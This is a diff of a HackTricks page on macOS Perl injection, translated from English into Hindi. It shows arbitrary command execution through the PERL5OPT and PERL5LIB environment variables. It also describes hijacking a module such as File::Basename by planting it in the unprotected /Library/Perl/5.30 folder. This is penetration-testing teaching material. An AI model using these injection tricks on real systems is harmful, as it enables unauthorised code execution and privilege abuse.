@@ -2,48 +2,37 @@
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-## Via `PERL5OPT` & `PERL5LIB` env variable
+## `PERL5OPT` और `PERL5LIB` एन्वायरनमेंट वेरिएबल के माध्यम से
 
-Using the env variable PERL5OPT it's possible to make perl execute arbitrary commands.\
-For example, create this script:
-
+एन्वायरनमेंट वेरिएबल PERL5OPT का उपयोग करके, यह संभव है कि पर्ल मनमाने कमांड्स को निष्पादित करे।\
+उदाहरण के लिए, इस स्क्रिप्ट को बनाएं:
 ```perl:test.pl
 #!/usr/bin/perl
 print "Hello from the Perl script!\n";
 ```
-
-Now **export the env variable** and execute the **perl** script:
-
+अब **env वेरिएबल को एक्सपोर्ट करें** और **perl** स्क्रिप्ट को निष्पादित करें:
 ```bash
 export PERL5OPT='-Mwarnings;system("whoami")'
 perl test.pl # This will execute "whoami"
 ```
-
-Another option is to create a Perl module (e.g. `/tmp/pmod.pm`):
-
+एक और विकल्प यह है कि एक Perl मॉड्यूल बनाया जाए (जैसे कि `/tmp/pmod.pm`):
 ```perl:/tmp/pmod.pm
 #!/usr/bin/perl
 package pmod;
 system('whoami');
 1; # Modules must return a true value
 ```
-
-And then use the env variables:
-
+और फिर env वेरिएबल्स का उपयोग करें:
 ```bash
 PERL5LIB=/tmp/ PERL5OPT=-Mpmod
 ```
+## निर्भरता के माध्यम से
 
-## Via dependencies
-
-It's possible to list the dependencies folder order of Perl running:
-
+Perl चलाने की निर्भरता फ़ोल्डर क्रम को सूचीबद्ध करना संभव है:
 ```bash
 perl -e 'print join("\n", @INC)'
 ```
-
-Which will return something like:
-
+जो कुछ इस तरह लौटाएगा:
 ```bash
 /Library/Perl/5.30/darwin-thread-multi-2level
 /Library/Perl/5.30
@@ -55,15 +44,14 @@ Which will return something like:
 /System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
 /System/Library/Perl/Extras/5.30
 ```
-
-Some of the returned folders doesn't even exist, however, **`/Library/Perl/5.30`** does **exist**, it's **not** **protected** by **SIP** and it's **before** the folders **protected by SIP**. Therefore, someone could abuse that folder to add script dependencies in there so a high privilege Perl script will load it.
+कुछ लौटाए गए फ़ोल्डर वास्तव में मौजूद नहीं हैं, हालाँकि, **`/Library/Perl/5.30`** वास्तव में **मौजूद** है, यह **SIP** द्वारा **सुरक्षित** नहीं है और यह **SIP** द्वारा **सुरक्षित** फ़ोल्डरों से **पहले** है। इसलिए, कोई उस फ़ोल्डर का दुरुपयोग कर सकता है ताकि वहाँ स्क्रिप्ट निर्भरताएँ जोड़ी जा सकें ताकि एक उच्च विशेषाधिकार प्राप्त Perl स्क्रिप्ट इसे लोड कर सके।
 
 > [!WARNING]
-> However, note that you **need to be root to write in that folder** and nowadays you will get this **TCC prompt**:
+> हालाँकि, ध्यान दें कि आपको उस फ़ोल्डर में लिखने के लिए **रूट** होना **ज़रूरी** है और आजकल आपको यह **TCC प्रॉम्प्ट** मिलेगा:
 
 <figure><img src="../../../images/image (28).png" alt="" width="244"><figcaption></figcaption></figure>
 
-For example, if a script is importing **`use File::Basename;`** it would be possible to create `/Library/Perl/5.30/File/Basename.pm` to make it execute arbitrary code.
+उदाहरण के लिए, यदि एक स्क्रिप्ट **`use File::Basename;`** आयात कर रही है, तो यह संभव होगा कि `/Library/Perl/5.30/File/Basename.pm` बनाया जाए ताकि यह मनमाना कोड निष्पादित कर सके।
 
 ## References
 
